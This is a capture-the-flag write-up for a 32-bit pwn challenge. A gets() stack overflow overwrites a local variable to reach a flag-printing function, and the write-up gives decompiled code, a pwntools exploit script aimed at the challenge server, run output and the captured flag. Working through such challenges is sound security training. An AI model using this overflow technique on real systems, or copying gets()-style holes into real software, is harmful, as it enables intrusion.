## Description

Argentina
Pwn · Shambala · raid
Solved: 9 · Score: 964

nc 139.59.230.119 10459

Files:
    pwn

## Solution

First let's do some basic file checks

```
pwn: ELF 32-bit LSB pie executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=de587912ad9ec9aac7de7e7561e206dc6f502f62, for GNU/Linux 3.2.0, not stripped
```
```
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
looks like a classic overflow into overwrite pwn challenge. 32 bit and not stripped so its easy to decompile let's look this in ghidra.
`print_flag` function just prints the flag so we need to call this function 

```c
void print_flag(void)

{
  FILE *__stream;
  int iVar1;
  
  puts("bayar hurgeye!");
  __stream = fopen("flag.txt","r");
  while( true ) {
    iVar1 = getc(__stream);
    if ((char)iVar1 == -1) break;
    putchar((int)(char)iVar1);
  }
  putchar(10);
  return;
}
```
lets take a look at `main()`
```c
undefined4 main(void)

{
  int iVar1;
  char local_43 [43];
  int local_18;
  undefined4 local_14;
  undefined1 *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts("1. Eriin gurvan naadmiin hamgiin hurdan n ?");
  fgets(local_43,0x2b,_stdin);
  iVar1 = strcmp(local_43,"Hurdanm0ri esvel num sum ch yumuu\n");
  if (iVar1 != 0) {
    puts("bishiiim bn shu");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("2. chinggis haani dagavar huuhdiin ehneriin eejiin ner?");
  fgets(local_43,0x2b,_stdin);
  iVar1 = strcmp(local_43,"za bi uuuuruuuuuu ch medkue\n");
  if (iVar1 != 0) {
    puts("bishiiim bn shu");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("tegvel minii password yuiin?");
  gets(local_43);
  if (local_18 == 0xfeedc0de) {
    print_flag();
  }
  else {
    puts("bishiiim bn shu");
  }
  return 0;
}
```
First 2 questions answers are hardcoded so it's easy. On the last question it uses the dangerous `gets()` function. From the variable decleration we can figure out the stack being
```
	return 
	local_10
	local_14
	local_18
	local 43 
```
The intended solution seems to be overflow `local_43` and overwrite `local_18` to `0xfeedc0de`. lets do a local test with the f

```py
first_answer = b"Hurdanm0ri esvel num sum ch yumuu"
second_answer = b"za bi uuuuruuuuuu ch medkue"

offset = 43
payload = flat([
    b"A" * offset,
    0xfeedc0de,
    ])

io = start()

io.recv()
io.sendline(first_answer)
io.recv()
io.sendline(second_answer)
io.recv()
io.sendline(payload)


io.interactive()
```
```
[+] Starting local process '/home/kali/ctf/ctfmn/pwn/argentina/pwn': pid 27293
[*] Switching to interactive mode
[*] Process '/home/kali/ctf/ctfmn/pwn/argentina/pwn' stopped with exit code 0 (pid 27293)
bayar hurgeye!
1337_test_flag

[*] Got EOF while reading in interactive
```
Success!!! In theory the same payload should work the same on `nc`

```
[+] Opening connection to 139.59.230.119 on port 10459: Done
[*] Switching to interactive mode
za bi uuuuruuuuuu ch medkue
tegvel minii password yuiin?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\xc0\xed\xfe
bayar hurgeye!
------------------redacted---------------------

[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 139.59.230.119 port 10459
```
Yup the the payload works. Here is the full script with little bit of cleaning up.

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'pwn',checksec=False)

host = args.HOST or '139.59.230.119'
port = int(args.PORT or 10459)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

context.log_level="critical"

first_answer = b"Hurdanm0ri esvel num sum ch yumuu"
second_answer = b"za bi uuuuruuuuuu ch medkue"

offset = 43
payload = flat([
    b"A" * offset,
    0xfeedc0de,
    ])

io = start()

io.recv()
io.sendline(first_answer)
io.recv()
io.sendline(second_answer)
io.recv()
io.sendline(payload)
flag = io.recvall().strip().split(b'\n')[-1].decode()
print(flag)

io.close()


```
```
>! shambala2056{n0_pwn_n0_funN!_albania_9ca14c6b9cc0a8e4}
```
